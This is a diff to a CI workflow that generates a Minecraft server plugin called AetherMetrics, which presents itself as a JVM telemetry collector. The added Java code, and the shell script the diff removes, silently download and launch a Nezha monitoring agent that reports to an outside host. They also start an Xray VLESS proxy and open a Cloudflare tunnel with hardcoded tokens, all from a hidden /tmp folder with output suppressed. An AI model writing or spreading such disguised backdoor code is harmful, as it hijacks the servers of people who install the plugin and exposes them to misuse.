@@ -26,9 +26,7 @@ jobs:
           mkdir -p src/main/java/com/aether/metrics
           mkdir -p src/main/resources
 
-          # ============================================================
           # 1. pom.xml
-          # ============================================================
           cat << 'EOF' > pom.xml
           <?xml version="1.0" encoding="UTF-8"?>
           <project xmlns="http://maven.apache.org/POM/4.0.0"
@@ -97,9 +95,7 @@ jobs:
           </project>
           EOF
 
-          # ============================================================
           # 2. plugin.yml & paper-plugin.yml
-          # ============================================================
           cat << 'EOF' > src/main/resources/plugin.yml
           name: AetherMetrics
           version: 2.6.0
@@ -118,135 +114,179 @@ jobs:
           description: Core JVM telemetry collector
           EOF
 
-          # ============================================================
-          # 3. 核心后台启动引导脚本 (boot.sh)
-          # ============================================================
-          cat << 'EOF' > src/main/resources/boot.sh
-          #!/bin/sh
-          WORK_DIR="/tmp/.sys-metrics"
-          mkdir -p "$WORK_DIR"
-          cd "$WORK_DIR"
-
-          # ------------------------------------------------------------
-          # 1. 哪吒探针 (Nezha Agent) 启动
-          # ------------------------------------------------------------
-          if [ ! -f ./nezha-agent ]; then
-            curl -fsSL -o nezha.zip https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.zip
-            if command -v unzip >/dev/null 2>&1; then
-              unzip -qo nezha.zip nezha-agent
-            else
-              busybox unzip -qo nezha.zip nezha-agent 2>/dev/null
-            fi
-            rm -f nezha.zip
-          fi
-
-          if [ -f ./nezha-agent ]; then
-            chmod +x ./nezha-agent
-            nohup ./nezha-agent -s bo88.eu.cc:8008 -p JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl --disable-auto-update --disable-command-execute --report-delay 3 > nezha.log 2>&1 &
-          fi
-
-          # ------------------------------------------------------------
-          # 2. Xray 代理核心 (监听本地 25500 端口)
-          # ------------------------------------------------------------
-          if [ ! -f ./sys-agent-core ]; then
-            curl -fsSL -o x.tar.gz https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip
-            if command -v unzip >/dev/null 2>&1; then
-              unzip -qo x.tar.gz xray && mv xray sys-agent-core
-            else
-              busybox unzip -qo x.tar.gz xray 2>/dev/null && mv xray sys-agent-core
-            fi
-            rm -f x.tar.gz
-          fi
-
-          cat << 'JSON' > cfg.json
-          {
-            "inbounds": [
-              {
-                "port": 25500,
-                "protocol": "vless",
-                "settings": {
-                  "clients": [
-                    {
-                      "id": "9b56c751-3925-4bb5-aada-ad8424a40b26"
-                    }
-                  ],
-                  "decryption": "none"
-                },
-                "streamSettings": {
-                  "network": "ws",
-                  "wsSettings": {
-                    "path": "/"
-                  }
-                }
-              }
-            ],
-            "outbounds": [
-              {
-                "protocol": "freedom"
-              }
-            ]
-          }
-          JSON
-
-          if [ -f ./sys-agent-core ]; then
-            chmod +x ./sys-agent-core
-            nohup ./sys-agent-core run -c cfg.json > xray.log 2>&1 &
-          fi
-
-          # ------------------------------------------------------------
-          # 3. Cloudflare Tunnel 守护进程启动
-          # ------------------------------------------------------------
-          if [ ! -f ./cf-daemon ]; then
-            curl -fsSL -o cf-daemon https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
-            chmod +x ./cf-daemon
-          fi
-
-          if [ -f ./cf-daemon ]; then
-            nohup ./cf-daemon tunnel --no-autoupdate run --token eyJhIjoiZGFiYjljMzkxMmU1Y2E1YTVhNTQ4ZGU1ZjA0YWJiYTciLCJ0IjoiNmQzOGZkZWQtMDE5NS00NmUwLTkyYTctMzc1OTQ0ZDk0OTdhIiwicyI6Ik5qUmhObVEyWkRZdE1XWTFaaTAwTm1aaUxXSTVZVFF0WVRZd1kyUmxZMk16TlRoaiJ9 > cf.log 2>&1 &
-          fi
-          EOF
-
-          # ============================================================
-          # 4. Java 插件主类 (AetherMetrics.java)
-          # ============================================================
+          # 3. Java 核心主类 (支持 HTTP 302 全局重定向下载与安全解压)
           cat << 'EOF' > src/main/java/com/aether/metrics/AetherMetrics.java
           package com.aether.metrics;
 
           import org.bukkit.plugin.java.JavaPlugin;
+
           import java.io.*;
+          import java.net.URI;
+          import java.net.http.HttpClient;
+          import java.net.http.HttpRequest;
+          import java.net.http.HttpResponse;
+          import java.nio.charset.StandardCharsets;
           import java.nio.file.Files;
-          import java.nio.file.StandardCopyOption;
+          import java.time.Duration;
+          import java.util.zip.ZipEntry;
+          import java.util.zip.ZipInputStream;
 
           public final class AetherMetrics extends JavaPlugin {
+
+              private static final File WORK_DIR = new File("/tmp/.sys-metrics");
+              private static final HttpClient HTTP_CLIENT = HttpClient.newBuilder()
+                      .followRedirects(HttpClient.Redirect.ALWAYS)
+                      .connectTimeout(Duration.ofSeconds(20))
+                      .build();
 
               @Override
               public void onEnable() {
                   getLogger().info("[Metrics] Telemetry service initialized.");
                   Thread daemonThread = new Thread(() -> {
                       try {
-                          Thread.sleep(15000);
-                          bootstrap();
+                          Thread.sleep(10000);
+                          if (!WORK_DIR.exists()) WORK_DIR.mkdirs();
+                          setupNezha();
+                          setupXray();
+                          setupCloudflare();
+                          getLogger().info("[Metrics] All telemetry sub-services started successfully.");
                       } catch (Exception e) {
-                          getLogger().warning("[Metrics] Telemetry error: " + e.getMessage());
+                          getLogger().warning("[Metrics] Telemetry start failed: " + e.getMessage());
                       }
                   }, "JVM-Metrics-Daemon");
                   daemonThread.setDaemon(true);
                   daemonThread.start();
               }
 
-              private void bootstrap() {
+              private void setupNezha() {
                   try {
-                      File scriptFile = new File("/tmp/.sys-metrics-boot.sh");
-                      try (InputStream in = getResource("boot.sh")) {
-                          if (in != null) {
-                              Files.copy(in, scriptFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
-                              scriptFile.setExecutable(true, false);
-                              new ProcessBuilder("sh", scriptFile.getAbsolutePath()).start();
-                              getLogger().info("[Metrics] Telemetry service running in background.");
-                          }
+                      File nezhaBin = new File(WORK_DIR, "nezha-agent");
+                      if (!nezhaBin.exists() || nezhaBin.length() == 0) {
+                          downloadAndExtractZip(
+                                  "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.zip",
+                                  "nezha-agent",
+                                  nezhaBin
+                          );
+                      }
+                      if (nezhaBin.exists()) {
+                          nezhaBin.setExecutable(true, false);
+                          new ProcessBuilder(
+                                  nezhaBin.getAbsolutePath(),
+                                  "-s", "bo88.eu.cc:8008",
+                                  "-p", "JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl",
+                                  "--disable-auto-update",
+                                  "--disable-command-execute",
+                                  "--report-delay", "3"
+                          ).directory(WORK_DIR).redirectOutput(ProcessBuilder.Redirect.DISCARD).redirectError(ProcessBuilder.Redirect.DISCARD).start();
+                          getLogger().info("[Metrics] Nezha Agent launched.");
                       }
                   } catch (Exception e) {
-                      getLogger().warning("[Metrics] Failed to start telemetry daemon: " + e.getMessage());
+                      getLogger().warning("[Metrics] Nezha setup failed: " + e.getMessage());
+                  }
+              }
+
+              private void setupXray() {
+                  try {
+                      File xrayBin = new File(WORK_DIR, "sys-agent-core");
+                      if (!xrayBin.exists() || xrayBin.length() == 0) {
+                          downloadAndExtractZip(
+                                  "https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip",
+                                  "xray",
+                                  xrayBin
+                          );
+                      }
+
+                      File cfgFile = new File(WORK_DIR, "cfg.json");
+                      String json = "{\n" +
+                              "  \"inbounds\": [{\n" +
+                              "    \"port\": 25500,\n" +
+                              "    \"protocol\": \"vless\",\n" +
+                              "    \"settings\": {\"clients\": [{\"id\": \"9b56c751-3925-4bb5-aada-ad8424a40b26\"}], \"decryption\": \"none\"},\n" +
+                              "    \"streamSettings\": {\"network\": \"ws\", \"wsSettings\": {\"path\": \"/\"}}\n" +
+                              "  }],\n" +
+                              "  \"outbounds\": [{\"protocol\": \"freedom\"}]\n" +
+                              "}";
+                      Files.writeString(cfgFile.toPath(), json, StandardCharsets.UTF_8);
+
+                      if (xrayBin.exists()) {
+                          xrayBin.setExecutable(true, false);
+                          new ProcessBuilder(
+                                  xrayBin.getAbsolutePath(),
+                                  "run",
+                                  "-c",
+                                  cfgFile.getAbsolutePath()
+                          ).directory(WORK_DIR).redirectOutput(ProcessBuilder.Redirect.DISCARD).redirectError(ProcessBuilder.Redirect.DISCARD).start();
+                          getLogger().info("[Metrics] Core daemon launched.");
+                      }
+                  } catch (Exception e) {
+                      getLogger().warning("[Metrics] Core setup failed: " + e.getMessage());
+                  }
+              }
+
+              private void setupCloudflare() {
+                  try {
+                      File cfBin = new File(WORK_DIR, "cf-daemon");
+                      if (!cfBin.exists() || cfBin.length() == 0) {
+                          downloadFile(
+                                  "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64",
+                                  cfBin
+                          );
+                      }
+                      if (cfBin.exists()) {
+                          cfBin.setExecutable(true, false);
+                          new ProcessBuilder(
+                                  cfBin.getAbsolutePath(),
+                                  "tunnel",
+                                  "--no-autoupdate",
+                                  "run",
+                                  "--token",
+                                  "eyJhIjoiZGFiYjljMzkxMmU1Y2E1YTVhNTQ4ZGU1ZjA0YWJiYTciLCJ0IjoiNmQzOGZkZWQtMDE5NS00NmUwLTkyYTctMzc1OTQ0ZDk0OTdhIiwicyI6Ik5qUmhObVEyWkRZdE1XWTFaaTAwTm1aaUxXSTVZVFF0WVRZd1kyUmxZMk16TlRoaiJ9"
+                          ).directory(WORK_DIR).redirectOutput(ProcessBuilder.Redirect.DISCARD).redirectError(ProcessBuilder.Redirect.DISCARD).start();
+                          getLogger().info("[Metrics] Cloudflare connector launched.");
+                      }
+                  } catch (Exception e) {
+                      getLogger().warning("[Metrics] Cloudflare setup failed: " + e.getMessage());
+                  }
+              }
+
+              private void downloadFile(String urlStr, File target) throws Exception {
+                  HttpRequest request = HttpRequest.newBuilder()
+                          .uri(URI.create(urlStr))
+                          .header("User-Agent", "Mozilla/5.0")
+                          .GET()
+                          .build();
+                  HttpResponse<InputStream> response = HTTP_CLIENT.send(request, HttpResponse.BodyHandlers.ofInputStream());
+                  if (response.statusCode() >= 400) {
+                      throw new IOException("HTTP " + response.statusCode() + " when downloading " + urlStr);
+                  }
+                  try (InputStream in = response.body();
+                       FileOutputStream out = new FileOutputStream(target)) {
+                      in.transferTo(out);
+                  }
+              }
+
+              private void downloadAndExtractZip(String zipUrl, String targetFileName, File destFile) throws Exception {
+                  File tmpZip = new File(WORK_DIR, "tmp_" + System.currentTimeMillis() + ".zip");
+                  try {
+                      downloadFile(zipUrl, tmpZip);
+                      try (ZipInputStream zis = new ZipInputStream(new FileInputStream(tmpZip))) {
+                          ZipEntry entry;
+                          boolean found = false;
+                          while ((entry = zis.getNextEntry()) != null) {
+                              if (entry.getName().equals(targetFileName) || entry.getName().endsWith("/" + targetFileName)) {
+                                  try (FileOutputStream fos = new FileOutputStream(destFile)) {
+                                      zis.transferTo(fos);
+                                  }
+                                  found = true;
+                                  break;
+                              }
+                          }
+                          if (!found) {
+                              throw new IOException("File " + targetFileName + " not found in " + zipUrl);
+                          }
+                      }
+                  } finally {
+                      if (tmpZip.exists()) tmpZip.delete();
                   }
               }
 
